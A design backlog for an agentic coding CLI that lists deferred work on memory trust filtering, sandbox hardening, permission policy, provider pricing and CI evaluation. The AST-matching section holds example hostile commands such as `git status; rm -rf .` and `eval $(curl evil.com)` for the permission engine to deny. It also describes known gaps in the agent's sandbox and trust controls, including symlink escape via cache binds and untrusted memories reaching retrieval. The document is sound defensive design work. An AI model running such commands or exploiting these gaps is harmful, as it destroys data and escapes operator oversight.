**What it is:** spec §6.5.2 formats the quarantine flag as `[memory: quarantined — <motivo> <YYYY-MM-DD>]` — e.g., `[memory: quarantined — conflict 2026-04-15]`. Both the `/memory list` slash command (T0.2) and the eager-load section in `cli/memory-prompt.ts` (T6.2) ship the minimal `[memory: quarantined]` flag today without the motivo + date enrichment.

**Why deferred:** motivo + date live in `eviction_events`, NOT in the memory frontmatter. Enriching the flag requires a JOIN against `eviction_events` (specifically the latest applied `quarantined` event for that `(scope, name)` pair via `getLastQuarantineEvent`). Two call sites means two JOIN points; both should land together when the enrichment is wired so the format stays consistent across surfaces.

**Where it would land:**

- `src/cli/slash/commands/memory.ts` — `handleList` already peeks per-listing for state rendering (T0.2). Extend to call `getLastQuarantineEvent(db, 'memory', name, scope)` for each quarantined entry; format `[QUARANTINED motivo YYYY-MM-DD]`.
- `src/cli/memory-prompt.ts` — `assembleMemorySection` already peeks for trust filter; extend to lookup the same quarantine event; format `[memory: quarantined — motivo YYYY-MM-DD]` per spec.

**Pull-in signal:** operator request OR detector volume crosses threshold where "which memory is quarantined for which reason" becomes opaque from the bare flag. Estimate: ~10 quarantined memories per install. Below that, the bare flag + `/memory audit` lookup is enough.

**Cost when pulled:** ~1 disk-cached SQL query per quarantined entry per render. For a session with N quarantined (likely < 5), negligible.

## Memory trust filter on `retrieve_context` slot (AGENTIC_CLI §1.1.5)

**Status:** acknowledged gap pre-S6; widened by S6 (quarantined memories now reach the slot, but no trust filter).

**What it is:** the retrieval memory view (`src/retrieval/views/memory.ts`) filters by `states: ['active', 'quarantined']` + `includeExpired: false` but does NOT filter by `trust`. An operator-marked `trust: untrusted` memory reaches the retrieve_context slot unimpeded — eager-load filters it out (§7.2.2), but retrieval doesn't.

**Why deferred:** the gap predates S6 (active untrusted memories already reached retrieval); S6 expanded it to include quarantined untrusted memories. Fixing it requires deciding the contract: hard-filter (mirror eager-load), include with marker, or operator-policy opt-in. Decision is design work, not just code work.

**Where it would land:**

- `src/retrieval/views/memory.ts:114-118` — add `trustFilter` option to the `registry.list()` call, OR a post-list filter on `listing.peek.frontmatter.trust`.
- Decide: trust=untrusted hard-filtered? Surface with `[memory: untrusted]` reason marker? Operator opt-in via `policy.retrieval.allow_untrusted = false` default?
- `tests/retrieval/memory-view.test.ts` — pin the chosen contract.

**Pull-in signal:** any of: (a) detector quality measurement reveals untrusted bodies systematically degrading retrieval relevance; (b) security review flags the surface explicitly; (c) operator-reported incident where untrusted body content shaped a model decision.

## Monotonic seq tiebreaker on the remaining time-ordered tables

**Status:** noted during the M3/Step 2.4 audit pass (2026-04-29).

**What it is:** migrations 007 (messages.seq) and 008 (sessions.seq)
fixed the timestamp-tie ordering bug for the two tables whose
listings drive resume behavior. The same bug shape exists in three
more time-ordered repos that fall back to UUID lex on tied
timestamps:

- `src/storage/repos/tool-calls.ts:130` — `ORDER BY created_at ASC, id ASC`
- `src/storage/repos/bg-processes.ts:148, 161` — `ORDER BY spawned_at DESC, id ASC`
- `src/storage/repos/approvals.ts:66` — `ORDER BY decided_at ASC, id ASC`

**Effect today:** none observable. Each listing function is
exported but has no production call site (verified via grep).
The listings are reserved for the audit CLI / recap / forensics
work that hasn't landed yet.

**Fix shape:** mirror migrations 007/008 — add `seq INTEGER NOT
NULL DEFAULT 0` to each table, populate atomically at INSERT time
via the `MAX(seq)+1` subquery, backfill via ROW_NUMBER over the
existing ORDER BY, secondary `seq` in each list query.

**Pull-in signal:** any of these listings gets wired to a live
consumer (audit CLI, recap subsystem, the `agent audit` command
in spec §13). At that point the ordering becomes load-bearing
and the same class of bug that hit messages/sessions becomes
visible to users. Apply the migrations together rather than
piecemeal — the schema-change cost amortizes across three repos
that all need it.

**Why deferred:** YAGNI. Adding three migrations + index changes
for tables nobody queries today is schema churn for a theoretical
bug. The pattern is well-established in 007/008 so the eventual
fix is mechanical.

---

## Trust prompt: aggregate-hash re-prompt on `.forja/` / `AGENTS.md` change (`AGENTIC_CLI §9.1`)

**Status:** the primary trust-prompt work is **done**. Both original
pull-in signals fired during M3/M4: the modal UI landed (`modalManager`
+ `askTrust` in `src/cli/repl.ts`), and multiple trust-relevant
artifacts are loaded today (permissions YAML, hooks, playbooks,
AGENTS.md). The full TODO entry was substantially closed without an
explicit close-out; this entry now tracks only the **residual**.

**What's already in:**

- `src/trust/` subsystem (`paths.ts`, `storage.ts`, `index.ts`).
- `~/.config/forja/trusted_dirs.json` persisted with absolute paths.
- `askTrust` modal wired in REPL boot **before** opening the editor
  or loading the rest of `.forja/` — fires on first-boot in a new
  cwd; subsequent boots in a trusted cwd skip the prompt.
- `[y/N]` answer flow with timeout + cancel paths covered by
  `tests/tui/modal-manager.test.ts` (slice 137 ops-3) and the
  REPL integration tests.

**What's still deferred — aggregate hash + re-prompt:**

Spec §9.1 calls for a hash of every loaded `.forja/` artifact +
`AGENTS.md`, stored alongside the trusted-dir entry. Re-prompt on
any subsequent boot where the hash diverges (operator updated
`.forja/permissions.yaml`, a new hook landed, AGENTS.md grew a
section). Storage explicitly documents this gap at
`src/trust/storage.ts:8-13`:

> "Spec §9.1 also calls for an aggregate hash of the project's
> `.forja/` content + `AGENTS.md`, with re-prompt on any change.
> That hardening is deferred to a follow-up slice; absent it, an
> operator who clones into a previously-trusted path inherits the
> trust without a re-confirm."

**Why this remainder is deferred:**

1. **Threat shape today is narrow.** Operator types `forja` in
   their own repo, not in arbitrary cloned trees from third parties.
   The hash-mismatch class of attack assumes a trusted cwd whose
   `.forja/` was rewritten between boots (by a co-located process or
   by `git pull`-ing changes); plausible but not currently observed.
2. **`inspect` mode is the real UX answer.** Spec wires the
   re-prompt to a `[y/N/inspecionar]` choice — "inspect" diffs
   `.forja/` against the trusted hash and renders what changed.
   That's a TUI subsystem of its own. Re-prompt without inspect is
   useless friction (operator just re-clicks `y`); inspect needs a
   diff renderer the project doesn't have yet.
3. **Spec §9.1 sub-hash for MCP.** `AUDIT.md §1.5`
   `mcp_manifest_history` is the same shape (hash + re-prompt) for
   MCP manifests. Bundle the two — the diff renderer and the hash
   scheme are shared.

**Pull-in signal:**

Pull this back into scope when EITHER:

- A team-shared trust storage scenario surfaces (more than one
  operator, or a cwd that team members `git pull` updates into).
  Hash mismatch becomes load-bearing the moment "an artifact under
  `.forja/` changed between trusted boot and now" stops being a
  hypothetical.
- MCP manifest trust lands. The `mcp_manifest_history` work
  expects the same hash-and-re-prompt machinery; bundle the work
  rather than building two parallel implementations.

**Spec reference:** `AGENTIC_CLI.md §9.1`, `SECURITY_GUIDELINE.md §9.1`,
`AUDIT.md §1.5` for `mcp_manifest_history` table that the MCP-trust
half consumes.

---

## Sandbox hardening: rlimits on the confined child (DoS resistance)

**Status:** surfaced by a sandbox security audit (an in-REPL glm-5.2 run, 2026-06-21), verified against the
code afterward. Severity recalibrated DOWN from the audit's "High": this is DoS-of-self, not a containment
break, and the audit's cited `SECURITY_GUIDELINE §8.2` requirement does NOT exist (no resource-limit clause
in the spec — that citation was a hallucination).

**What it is:** `buildBwrapArgv` (`src/permissions/sandbox-runner.ts`) sets namespaces, session, and
die-with-parent but attaches NO resource limits (memory / CPU / nproc / file-size). A confined child is FS-
and network-isolated (no breakout / exfil), but UNBOUNDED — it can fork-bomb, OOM, or fill the tmpfs `/tmp`,
taking down the agent and stressing the host.

**Why deferred:** hardening, not a containment hole — the isolation that matters (FS, network, env) holds.
No spec requirement and no observed incident; it raises the floor against a runaway / hostile bash.

**Where it would land:** wrap the bwrap exec with `prlimit` / `systemd-run --user --scope` / a `ulimit`
preamble, with per-profile CPU / memory / nproc / file-size caps. Mirror a sensible default on the macOS path
where Seatbelt allows.

**Pull-in signal:** a sandboxed bash fork-bombs / OOMs the agent in real use, or a threat-model pass
prioritizes DoS resistance for untrusted-repo / multi-tenant operation.

**Spec reference:** none today (the audit's `§8.2` citation is unfounded). A `SECURITY_GUIDELINE` clause on
resource limits could accompany the work.

---

## Sandbox hardening: canonicalize the cache carve-out source before `--bind`

**Status:** surfaced by the same sandbox audit (2026-06-21) and verified — but it is a KNOWN, in-code
documented limitation (`src/permissions/sandbox-runner.ts:153-157`), not a hidden bug. Medium.

**What it is:** `canonicalizeCwd` realpath-resolves cwd (and home) so the `hide_paths` check, the `--bind`,
and the `--chdir` all agree on one canonical target. The cache carve-out dirs (`~/.cache`, `GOCACHE`, etc.)
bound into the sandbox are NOT canonicalized. A symlink planted inside a cache dir (by a prior tool call or a
hostile repo) can point outside the allowed tree, and `bwrap` follows it at mount time — granting the
sandboxed process read/write to host paths that should be unreachable.

**Why deferred:** the in-code comment already flags it; closing it fully needs a recursive realpath sweep of
the cache trees (cost), and the practical exposure requires an attacker who can plant a symlink inside a
cache dir. The cwd / home canonicalization (the common path) already holds.

**Where it would land:** `src/permissions/sandbox-cache-dirs.ts` / `sandbox-runner.ts` — realpath-resolve each
cache-dir source before `--bind`, and reject (or resolve-and-rebind) any cache entry whose canonical target
leaves the allowed tree. A shallow realpath of the bind ROOT is cheap; the recursive sweep of contents is the
expensive part the comment notes.

**Pull-in signal:** an untrusted-repo / multi-tenant scenario where a cache dir could be symlink-poisoned, or
a security review that won't accept the documented carve-out.

**Spec reference:** `SECURITY_GUIDELINE` (sandbox path canonicalization); the in-code limitation comment at
`sandbox-runner.ts:153-157` is the current record.

---

## Surface the per-turn models / metered-untracked breakdown in cost surfaces

**Status:** noted 2026-06-21 during the code review of the per-turn model provenance fix
(migration 077). The deep fix landed — metering now resolves from the models a session
ACTUALLY used (`effectiveSessionModels` + `isSessionUnmetered`), so the `unmetered` flag is
accurate and spend is never hidden. This tracks the remaining READ-side presentation gap.

**What it is:** `--list --json` still emits `model: sessions.model` (the INITIAL model) next
to the now-accurate `unmetered` flag, so the two can disagree — `model` reads as an
unmetered-tier id while `unmetered: false` because a later turn billed on a metered model —
and a JSON consumer has no field that reconciles them: the per-turn models that explain the
flag are never surfaced. Likewise, a mixed metered+unmetered session shows the tracked
dollars but no precise "$X metered on A/B + untracked on C" breakdown; only `/stats` hints
"+ unmetered (untracked usage in scope)" at the scope level.

**Why deferred:** the flag is correct and no spend is hidden (the data-loss risk is closed);
this is presentation precision for tooling / forensics, not a correctness gap. The data
already exists (`distinctSessionModels`), so it's a small read-only follow-up.

**Where it would land:**

- `src/cli/list-sessions.ts` — add `models: string[]` (or a `metered` / `untracked` split)
  to `SessionListItem`, populated from `distinctSessionModels(db, s.id)`.
- `/sessions` + `/stats` human renders — optionally show the per-turn model set when it
  differs from `sessions.model`.

**Pull-in signal:** a tooling / billing consumer of `--list --json` needs to know WHICH
models billed a session (not just whether it's unmetered), or an operator asks why a row
reads as metered when its `model` column shows an unmetered tier.

**Cost when pulled:** small — `distinctSessionModels` already exists; a field add + render,
no schema or write-path change.

---

## Rename `cost_per_1k_*` → `cost_per_1m_*` on `ProviderCapabilities`

**Status:** field-name vs value-unit mismatch. Surfaced during the
M2 / Step 6 smoke baseline run. Math fixed inline; rename
deferred.

**What it is:** every `ProviderCapabilities` entry stores rates in
dollars-per-million tokens (the convention Anthropic, OpenAI, and
Google publish in). The fields are spelled `cost_per_1k_input`,
`cost_per_1k_output`, `cost_per_1k_cached_input`,
`cost_per_1k_cache_write`. The math in `src/providers/cost.ts`
now divides by `1_000_000` to match the values; the field name
still says `_1k_`, which is a footgun for anyone adding a new
provider.

**Why deferred:**

1. **Cross-cutting rename.** Touches `src/providers/types.ts`,
   `src/providers/cost.ts`, all three provider capabilities files
   (`anthropic`, `openai`, `google`), and `docs/spec/PROVIDERS.md`
   §5 (which sources the values). Several test files reference
   the field names directly. Doing it as a separate commit keeps
   the diff readable and the Step 6 commit focused on the eval
   harness.
2. **No correctness risk today.** The numbers are right and the
   math is right. The only cost is naming clarity for future
   contributors.
3. **Spec PR first.** The field name lives in the typed contract
   that PROVIDERS.md §5 documents; a rename without a spec
   amendment would diverge code from spec. Per CLAUDE.md, the
   spec leads, code follows.

**Pull-in signal:**

Pull when EITHER:

- A new provider is being added to the registry (we'd write the
  wrong field name otherwise).
- The cost telemetry surface changes (e.g., we add tier rates,
  per-region pricing) — bundle the rename into that PR.

**Spec reference:** `PROVIDERS.md §5`, `src/providers/cost.ts`
(comment block already flags the followup).

---

## Add gpt-5.x family to the OpenAI registry

**Status:** registry stuck on gpt-4o lineage. Surfaced during
the M2 / Step 6 pricing audit when the user shared the
current OpenAI pricing table.

**What it is:** `src/providers/openai/capabilities.ts` declares
`gpt-4o` and `gpt-4o-mini` only. The current OpenAI flagship
family is gpt-5.x:

| Model | Input ($/M) | Cached ($/M) | Output ($/M) |
|---|---|---|---|
| gpt-5.5 | $5.00 | $0.50 | $30.00 |
| gpt-5.5-pro | $30.00 | – | $180.00 |
| gpt-5.4 | $2.50 | $0.25 | $15.00 |
| gpt-5.4-mini | $0.75 | $0.075 | $4.50 |
| gpt-5.4-nano | $0.20 | $0.02 | $1.25 |
| gpt-5.4-pro | $30.00 | – | $180.00 |

Plus a long-context tier with different pricing for gpt-5.5
and gpt-5.4 — that tier doesn't fit the current
`ProviderCapabilities` shape (single input/output rate per
model) and would require a contract change.

**Why deferred:**

1. **Feature work, not hardening.** Adding new models means
   new defaults (which one becomes `recommended_for:
   autonomous`?), new capabilities matrix entries, and a
   spec amendment to `PROVIDERS.md §5`. That's a feature
   PR, not part of the M2 closure.
2. **gpt-5.x uses `max_completion_tokens`, not `max_tokens`.**
   Our adapter sends `max_tokens`. Adding gpt-5.x models
   without adapter changes would 400 every request. Need a
   capability flag (`uses_max_completion_tokens: true`) and
   a code branch in `src/providers/openai/index.ts`.
3. **Long-context tier requires schema change.** Current
   `cost_per_1k_*` fields assume a single rate per token
   class per model. gpt-5.5 prices Short context vs Long
   context differently — adding this means
   `cost_per_*` becomes a function of effective context
   size, or splitting into per-tier model entries
   (`gpt-5.5-short`, `gpt-5.5-long`). Spec decision.
4. **Reasoning model semantics.** gpt-5.x is a reasoning
   family — `o`-series-style internal thinking that bills
   under `output_tokens` but isn't user-visible. Smoke would
   under-budget if cases assume non-reasoning token costs.
   Need to handle `reasoning_tokens` in usage normalization.

**Pull-in signal:**

Pull this back when EITHER:

- A user prompt requires reasoning quality the gpt-4o family
  can't deliver, AND the cost envelope makes gpt-5.4-mini
  reasonable as the new OpenAI default.
- Anthropic releases a competing reasoning model and we
  want head-to-head measurement (forces the spec PR
  anyway).

**Spec reference:** `PROVIDERS.md §5` (model registry table
needs amendment), `TOKEN_TUNING.md §3` (reasoning token
accounting), `src/providers/openai/index.ts` (param shape).

---

## Smoke baseline against Gemini

**Status:** Gemini adapter has unit coverage but never ran
end-to-end. Surfaced during the M2 / Step 6.3 multi-provider
review.

**What it is:** run `bun run eval:smoke -- --model
google/gemini-2.5-flash --repeat 3` against a real Gemini
endpoint. Same shape as the Anthropic and OpenAI baselines
already documented in BACKLOG (Step 6.2 / 6.3). Goal: 24/24
with `compaction_triggered: { strategy: llm }` confirmed on
the third provider.

**Why deferred:**

1. **Gemini pricing in registry is illustrative, not real.**
   `src/providers/google/capabilities.ts` literally says so
   in a comment ("Numbers below match the unit convention
   used elsewhere in the registry — they are not committed
   real Gemini prices"). Running smoke today would test the
   adapter's wire shape against fake pricing, conflating
   two issues. Cost numbers in the baseline would be
   meaningless.
2. **Gemini has different correlation semantics for
   tool_results.** Spec calls this out in
   `ProviderToolResultBlock.name` — Gemini correlates
   results to calls by name, not by id. The Anthropic
   adapter strips `name` before sending; the OpenAI adapter
   uses `tool_call_id`. The Google adapter's behavior here
   needs validation under load — high probability of a
   `name`-class bug analogous to what the Anthropic smoke
   surfaced.
3. **Need a Gemini API key.** Operational dependency, not
   technical.

**Pull-in signal:**

Pull when EITHER:

- The pricing values in `google/capabilities.ts` get updated
  to real Gemini pricing (likely bundled with the
  `cost_per_1k_*` → `cost_per_1m_*` rename and a
  `PROVIDERS.md §5` amendment).
- A user workflow calls for Gemini specifically (the 2M
  context window or the price/quality on simple summarization
  tasks).

**Whichever lands first.** Bundle the smoke run with the
pricing fix so the baseline numbers are trustworthy from
day one.

**Spec reference:** `PROVIDERS.md §5` and `§7`,
`src/providers/google/{capabilities,index,stream}.ts`.

---

## CI gate on smoke

**Status:** smoke harness is CI-ready but no pipeline wired.
Tracked since Step 6.

**What it is:** GitHub Actions (or equivalent) workflow that
runs `bun run eval:smoke --repeat 3 --model
anthropic/claude-haiku-4-5` on every PR (and/or main push)
and blocks merge on regression. Gates on:

- 100% pass rate (24/24 with strict-pass semantics).
- Cost envelope: total ≤ $0.20/run (10× headroom over
  current baseline).
- Per-case stability: no `failCount > 0` in the
  `eval_case_aggregate` output.

**Why deferred:**

1. **Cost per PR is recurring spend.** Anthropic baseline
   today: $0.15 per CI run. At 50 PRs/week that's ~$30/mo.
   Trivial in absolute terms but real ops cost; needs a
   budgeting decision before turning on.
2. **Single-provider gate or multi-provider?** Running both
   Anthropic and OpenAI smoke per PR doubles cost
   ($0.16/run total). Multi-provider catches more
   regressions but costs more. Decision waits until
   Gemini lands so the spread is visible.
3. **Secret management.** `ANTHROPIC_API_KEY` (and OpenAI/
   Gemini if multi-provider) needs to live as a repo secret.
   Threshold question: who has merge access to the workflow
   file? A malicious workflow change could exfiltrate the
   key. Current repo is solo-author so low risk, but the
   policy should be set before the second contributor lands.
4. **Smoke catches the wrong class of bug for some PRs.**
   A docs-only PR shouldn't pay $0.15 to re-validate the
   adapter. Need a `paths-ignore` filter (skip on
   `docs/**`, `*.md`, etc.) to avoid burning budget on
   no-op runs. Easy but worth doing right.
5. **Need a baseline-drift detection mechanism.** If
   gpt-4o-mini tomorrow costs 10% more per request (OpenAI
   re-prices, infrastructure shift, etc.), should the gate
   fail or warn? Hard threshold means false-positives;
   warn-only means the gate is decorative. Need to decide
   the policy first.

**Pull-in signal:**

Pull this when EITHER:

- A second contributor is merging PRs (gate prevents merge
  of broken adapter changes, value is concrete).
- A regression actually slips through and burns time
  debugging post-merge — that's the moment the gate
  becomes obviously cheap.

**Pre-requisites the gate depends on:**

- Multi-provider baseline stable (this is in place after
  Step 6.3).
- A `eval:regression` tier (~100 cases) so smoke doesn't
  carry the full validation load. Spec §16 places this in
  M3+.
- Baseline-drift policy decision (above).

**Spec reference:** `AGENTIC_CLI.md §16` ("Roda em CI.
Comparação contra **golden traces** versionados. Mudou
prompt do system? Roda eval. Regrediu? PR bloqueado.").

---

## Native structured output for compaction / critique / recap

**Status:** noted while reviewing the M4 critique branch
(2026-05-08). The contract slot exists
(`Provider.generateConstrained`) but is unused by the harness
paths that emit JSON-shaped output.

**What it is:** three subsystems currently emit JSON between
sentinel markers and parse the result with a custom parser.
Failure rate observed in the M4 real-eval was ~5% (markers
missing, malformed JSON, Unicode quotes in place of ASCII,
etc.). Today's call sites:

| Surface | Current mechanism | Reliability |
|---|---|---|
| Tool calls (`task`, `bash`, ...) | Native tool calling | Strong |
| Compaction summary | Markers + JSON parse | Weak |
| Critique output | Markers + JSON parse | Weak |
| Recap render | Markers + parse | Weak |
| Memory write proposals | Tool args | Strong |

The marker convention was chosen for cross-provider uniformity
at a time when JSON modes were patchy. Today every cloud
provider in the registry has a native structured-output path:

| Mechanism | Provider support | Guarantee |
|---|---|---|
| Tool calling with `input_schema` | Anthropic, OpenAI, Google | Strong (provider-validated) |
| `response_format: json_object` | OpenAI, partial Anthropic | Medium (no types in schema) |
| `response_schema` (JSON Schema) | Google, OpenAI Structured Outputs | Strong |
| GBNF / EBNF grammar | llama.cpp, vLLM | Strong (token-level) |
| Markers + parse | Any | Weak (best-effort) |

When a parse fails today, the critique engine writes
`strategy='failed'` to `critique_runs` and the run survives
(engine is fail-soft). Compaction falls back to the
deterministic summarizer when the marker close-tag is missing,
so the operator silently loses the semantic summary.

**Why deferred:**

1. **Real-world failure rate is low under default config.**
   5% sounds large until you remember that critique mode `off`
   is the default. The failure envelope only matters for
   opt-in `mode='always'` + long sessions. Compaction shares
   the parser shape but is invoked rarely (per-trigger, not
   per-step). Recap is on-demand. The blast radius today is
   "audit-row noise + fallback to deterministic path", not
   user-visible breakage.
2. **Cross-provider abstraction is non-trivial.** Each
   provider exposes structured output differently; a naive
   wire-up would scatter provider conditionals into the
   engine. The right shape is a schema-aware layer one step
   above the `Provider` interface, accepting a JSON Schema
   and routing to tool_use / response_format / response_schema
   / GBNF, with a marker fallback for providers that lack any
   constrained mode (older local models). Worth designing
   once, not per call site.
3. **Streaming + structured is still emerging.**
   `generateConstrained` returns the full string at the end,
   sacrificing streaming UX. Some providers already support
   streaming structured output (Anthropic tool_use streaming,
   OpenAI delta-mode structured outputs); bundling streaming
   into the same design pass avoids two rewrites.

**Pull-in signal:**

Pull when EITHER:

- A subsystem starts running `mode='always'` critique (or any
  equivalent always-on JSON path) and `parse_failed` /
  `markers_missing` audit rows accumulate enough to be visibly
  noisy. The typed contract pays for itself within weeks at
  that point.
- A new subsystem is added that needs JSON-shaped LLM output
  (planner emits structured plan, reviewer subagent emits
  structured findings). Cheaper to ship the abstraction once
  than to add a third marker-parser call site.

**Concrete shape (when pulled):**

```ts
const tool: ProviderToolDef = {
  name: 'emit_critique',
  description: 'Emit your structured critique',
  input_schema: {
    type: 'object',
    properties: {
      issues: { type: 'array', items: { /* ... */ } },
      overall_confidence: { type: 'number' },
    },
    required: ['issues', 'overall_confidence'],
  },
};
const req: ConstrainedRequest = {
  ...gen,
  tools: [tool],
  tool_choice: { type: 'tool', name: 'emit_critique' },
};
```

**Estimated work:**

- ~1 week — wire `generateConstrained` into the critique
  engine, fallback to markers when the provider lacks a
  structured mode.
- +1 week — same for compaction.
- +2 weeks — schema-aware abstraction above the provider
  contract; route a single JSON Schema to tool_use /
  response_format / response_schema / GBNF.
- Test suite: per-provider conformance (output respects the
  schema, not merely parses) + fallback semantics.

**Comparison vs. status quo:**

| | Markers + parse | Native structured |
|---|---|---|
| Provider effort | none (string interpreted) | provider enforces at token level |
| Observed failure rate | ~5% | <1% |
| Cost | same | same |
| Vendor lock-in | none | per-provider feature mapping |
| DX (engine code) | custom parser | typed contract |

**Spec reference:** `PROVIDERS.md §3` (Provider contract),
`CONTEXT_TUNING.md` (compaction), `AGENTIC_CLI.md §5.4` and
`ORCHESTRATION.md §6` (critique), `RECAP.md`.

---

## Permission policy ergonomics

**Status:** noted during the M4 critique branch review
(2026-05-08). The permission engine is functionally complete;
usability gaps surfaced repeatedly while running multi-step
flows during the branch.

**What it is:** the permission hierarchy (enterprise → user →
project → session) and the YAML rule shape work, but the
operator surface around them has friction. Six concrete pain
points observed:

a) **Discovery.** Operators don't know what permissions they
need until they hit the modal. Typical session yields 10–30
modals. Recurring workflows pay the cost on every restart.

b) **No pattern recognition.** Approving `bash("npm test")`
five times in one session does not surface a "promote to
allowlist?" suggestion. Only the modal's
"yes-allow-all-during-this-session" toggle exists, and it is
volatile (lost on restart).

c) **Visualization gaps.** `/perms` shows the merged policy
but does not show: what was approved this session, the
history of denials, or the practical diff between modes
(`strict` vs `acceptEdits`).

d) **Mode names are opaque.** `strict | acceptEdits | bypass`
require reading `AGENTIC_CLI.md §8` to interpret. New
operators have no inline hint.

e) **Glob is fragile for shell.** `command_glob: 'rm *'`
matches both `rm -rf /` (intended) and `git rm file.txt`
(probably not intended). Bash's command space is semantically
rich; text glob over the raw command string is a leaky
abstraction.

f) **Denial errors are unhelpful.** Tool denied → `ToolError`
with a generic message to both the model and the operator.
Neither sees which rule fired or which layer holds it.

**Why deferred:**

1. **Not a correctness gap.** Every pain point above is
   friction, not a bug. The engine refuses what it should
   refuse and allows what it should allow. Operators
   tolerate the friction today because session count is
   low and the team is small.
2. **Adjacent subsystems should land first.** Pattern
   learning (Tier 2 below) needs durable session-scoped
   audit history that today only exists transiently. Tier 4
   (AST-based bash matching) needs a shell-parser dependency
   decision the codebase hasn't made yet.
3. **Risk of incentivizing `bypass`.** Premature ergonomics
   work that surfaces "easy approve" affordances without
   first exposing the underlying policy can push operators
   toward `bypass` mode, the opposite of the safety goal.
   Order matters: discoverability before promotion.
4. **Composes with sandbox.** Sandbox of tool execution is
   the structural defense layer; ergonomics is the operator
   layer above it. Doing ergonomics first means redoing some
   of the surface once sandbox lands.

**Pull-in signal:**

Pull when EITHER:

- A second operator joins the project and modal volume
  becomes a complaint (the discovery pain compounds with
  team size).
- The session-history audit work referenced in `AUDIT.md`
  lands, unblocking pattern learning without a new schema.
- An incident is traced to a glob false-positive — Tier 4
  becomes load-bearing the moment a permissive `*` rule
  allows something the operator did not intend.

**Tier breakdown (when pulled):**

| Tier | Scope | Estimated work |
|---|---|---|
| 1 | Discoverability: `--explain-permissions`, modal cites matching rule + layer, `/perms why <tool>` | ~2 weeks |
| 2 | Pattern learning (opt-in): N-approval prompt to promote, `--learn-mode`, `/perms suggestions` | ~3 weeks |
| 3 | Policy templates: `safe-readonly`, `trusted-fullstack`, `ci-locked`; `forja init --template=<name>` | ~1 week |
| 4 | AST-based bash matching; explicit relative-vs-absolute path glob semantics; rule composability (any-of / all-of) | ~2 weeks |
| 5 | `/perms diff session`, `/perms commit` (promote session-allowlist to project layer with confirm), `/perms revert` | ~1 week |

**Trade-offs:**

- **Pro:** UX value per engineer-day is high; zero
  architectural risk (pure surface work).
- **Pro:** Reduces modal fatigue, so operators leave strict
  mode on rather than defaulting to bypass.
- **Pro:** Pattern learning is a positive safety layer
  (visibility into accumulated session approvals).
- **Pro:** Composes with sandbox-of-tool-execution as
  defense in depth.
- **Con:** Policy UX is a known-difficult design space;
  rolling Tier 2 without a thoughtful flow can backfire
  (auto-promote surprises).
- **Con:** Risk of pushing operators toward `bypass` if the
  "fast path" is too prominent.

**Mitigations to bake into the design when pulled:**

- `--no-auto-promote` flag for operators who want the modal
  flow as-is.
- Every promote action requires explicit confirm; never
  silent.
- Tier 2 reads from durable audit, not in-memory state, so
  suggestions survive restarts and can be reviewed offline.

**Spec reference:** `AGENTIC_CLI.md §8` (permissions),
`SECURITY_GUIDELINE.md` (threat model), `AUDIT.md` (session
history that pattern learning would consume).

---

## AST-based bash matching (Tier 4 of permission ergonomics)

**Status:** noted while landing the compound-command guard
(commit `a90ce12`, 2026-05-08). The guard closes the most
blatant injection path (`*` in allow patterns admitted
`git status; rm -rf .`); AST-based matching is the more
complete answer to expressing bash policy as STRUCTURE rather
than text.

**What it is:** parse every bash command into a syntax tree
(via `tree-sitter-bash`, `mvdan-sh`, or similar) and apply
policy rules to specific nodes — Command, Pipeline,
Redirection, Substitution. Replaces the current glob-string
matching with a structural matcher that knows the difference
between a literal `;` inside a quoted message and a real
compound separator.

**What it solves that the current engine doesn't:**

| Situation | Compound guard (today) | AST |
|---|---|---|
| `git log \| head` (legit pipe) | always confirm | allow if both `git log` and `head` pass policy |
| `git status; rm -rf .` | confirm (operator sees) | deny (`rm -rf *` matches the second segment) |
| `rm -rf $UNTRUSTED_VAR` | confirm | deny structurally ("destructive command + variable interpolation") |
| `echo X > /etc/Y` | matched-rule on `echo*` possible | redirection node visible; policy can deny redirects to `/etc/**` |
| `eval $(curl evil.com)` | confirm | deny by structure ("eval with command-substitution") |

The two real wins:

1. **No false-confirm on legitimate pipes.** Operator-heavy
   workflows (autonomous mode, batch sweeps) currently pay a
   modal for every `find ... \| head` because the compound
   guard has no way to distinguish "compound that's still
   safe" from "compound that's an injection". AST splits the
   pipeline and checks each side.
2. **Argument-aware policy.** Current rules are text globs
   over the command string. AST exposes flag/arg structure,
   so deny patterns can target semantics (`destructive +
   target-outside-cwd`) instead of literal-string shapes.

**What it does NOT solve:**

- Dynamic execution post-approval — AST is a parser, not a
  sandbox. `chmod 777 /etc` correctly parsed and approved
  still breaks things.
- Lateral movement — the model approved bash → tool runs →
  tool internally calls `system("rm ...")`. AST sees only the
  initial command.
- Variable contents — AST sees a `$VAR` node, not its value.
  Closing this needs eval / taint-tracking, which is a
  different territory entirely.

AST is precision of POLICY EXPRESSION, not runtime defense.

**Why deferred:**

1. **Diminishing returns over the compound guard.** The guard
   closes the catastrophic shapes (`git status; rm -rf .`
   silently allowed) at ~50 lines of code. AST closes the
   remaining 10% (legit pipes, structural deny rules) at ~2-3
   weeks of focused work. Most of that 10% is "operator pays
   one extra modal per pipe shape" — fatigue, not safety.
2. **Bigger blast-radius defenses come first.** Sandbox of
   tool execution (bwrap/firejail) is the architecturally
   higher-leverage move: it bounds blast radius regardless of
   how policy was expressed. AST competes with sandbox for
   eng time and loses on impact.
3. **Bundle weight.** `tree-sitter` (~5MB WASM) + grammar
   (~500KB) is real growth for a CLI tool. Worth paying when
   the value is concrete; not worth paying for marginal
   policy precision.
4. **Policy schema redesign.** Today: `allow: ["git status*"]`.
   With AST, three options: (a) new structural schema
   (`allow: { command: 'git', args_prefix: ['status'] }`,
   breaking), (b) compile globs to AST patterns (compiler
   work), or (c) hybrid — globs for the simple case, AST
   for compound. Each is its own design pass before any
   code lands. Spec PR work is non-trivial.

**Pull-in signal:**

Pull when ANY of:

- Autonomous-posture workloads become routine. (**Partly addressed
  2026-06-01:** autonomous now auto-approves a compound whose every
  resolved capability is repo-confined — by EFFECT, not structure — so
  repo-local compound fatigue is gone without this AST-policy work. The
  signal narrows to SUPERVISED operators, and to autonomous compounds
  carrying a non-confined effect — network / outside-repo / unknown-binary
  — which still modal by design.) Visible in audit: many `confirm`
  decisions on the same compound shape, all approved.
- A real-world policy bypass via the current matcher's
  string-glob limits surfaces (operator reports
  "I had `allow: foo*` and got bitten by `foo$(...)`"). One
  incident is enough — the existing guard's heuristic for
  `$(...)` detection has known gaps under specific quote
  combinations.
- Sandbox of tool execution lands and the next bottleneck on
  trust becomes "operator wants to express semantic safety
  rules" (e.g., "deny any write outside cwd"). At that
  point the AST work compounds with the sandbox to give
  defense-in-depth.

**Pre-requisites the project should have first:**

